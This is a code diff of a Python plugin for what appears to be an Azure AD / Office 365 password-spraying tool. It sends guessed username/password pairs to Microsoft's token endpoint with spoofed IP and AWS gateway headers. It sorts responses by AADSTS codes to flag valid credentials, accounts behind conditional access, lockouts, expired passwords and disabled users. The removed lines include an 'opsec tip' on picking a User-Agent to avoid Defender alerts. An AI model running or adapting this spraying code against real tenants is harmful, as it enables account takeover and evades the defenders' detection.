@@ -6,9 +6,9 @@ requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.
 def extract_error(desc):
 
     return desc.split(":")[0].strip()
+    
 
-
-def msgraph_authenticate(url, username, password,  useragent, pluginargs):
+def spray_msol_authenticate(url, username, password, useragent, pluginargs):
 
     data_response = {
         'result' : None,    # Can be "success", "failure" or "potential"
@@ -29,7 +29,7 @@ def msgraph_authenticate(url, username, password,  useragent, pluginargs):
     client_id = random.choice(client_ids)
 
     body = {
-        'resource' : 'https://graph.microsoft.com',
+        'resource' : 'https://graph.windows.net',
         'client_id' : client_id,
         'client_info' : '1',
         'grant_type' : 'password',
@@ -37,7 +37,6 @@ def msgraph_authenticate(url, username, password,  useragent, pluginargs):
         'password' : password,
         'scope' : 'openid',
     }
-
 
     spoofed_ip = utils.generate_ip()
     amazon_id = utils.generate_id()
@@ -47,11 +46,10 @@ def msgraph_authenticate(url, username, password,  useragent, pluginargs):
         "X-My-X-Forwarded-For" : spoofed_ip,
         "x-amzn-apigateway-api-id" : amazon_id,
         "X-My-X-Amzn-Trace-Id" : trace_id,
-        # Opsec tip: UA must be edge otherwise Defender for cloud will flag it!
-        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.50",
+        "User-Agent" : useragent,
 
-        'Accept': 'application/json',
-        'Content-Type': 'application/x-www-form-urlencoded'
+        'Accept' : 'application/json',
+        'Content-Type' : 'application/x-www-form-urlencoded'
     }
 
     headers = utils.add_custom_headers(pluginargs, headers)
@@ -80,7 +78,7 @@ def msgraph_authenticate(url, username, password,  useragent, pluginargs):
             elif "AADSTS50034" in error:
                 data_response['result'] = "failure"
                 data_response['output'] = f'[-] FAILURE ({error_code}): Tenant for account {username} is not using AzureAD/Office365'
-            
+
             elif "AADSTS53003" in error:
                 # Access successful but blocked by CAP
                 data_response['result'] = "success"
@@ -105,6 +103,12 @@ def msgraph_authenticate(url, username, password,  useragent, pluginargs):
                 data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                 data_response['valid_user'] = True
 
+            elif "AADSTS53003" in error and not "AADSTS530034" in error:
+                # Conditional Access response as per https://github.com/dafthack/MSOLSpray/issues/5
+                data_response['result'] = "success"
+                data_response['output'] =f"SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates a conditional access policy is in place and the policy blocks token issuance."
+                data_response['valid_user'] = True
+
             elif "AADSTS50053" in error:
                 # Locked out account or Smart Lockout in place
                 data_response['result'] = "potential"
@@ -116,6 +120,12 @@ def msgraph_authenticate(url, username, password,  useragent, pluginargs):
                 data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The user's password is expired."
                 data_response['valid_user'] = True
 
+            elif "AADSTS50057" in error:
+                # The user account is disabled
+                data_response['result'] = "success"
+                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The user is disabled."
+                data_response['valid_user'] = True
+                
             else:
                 # Unknown errors
                 data_response['result'] = "failure"
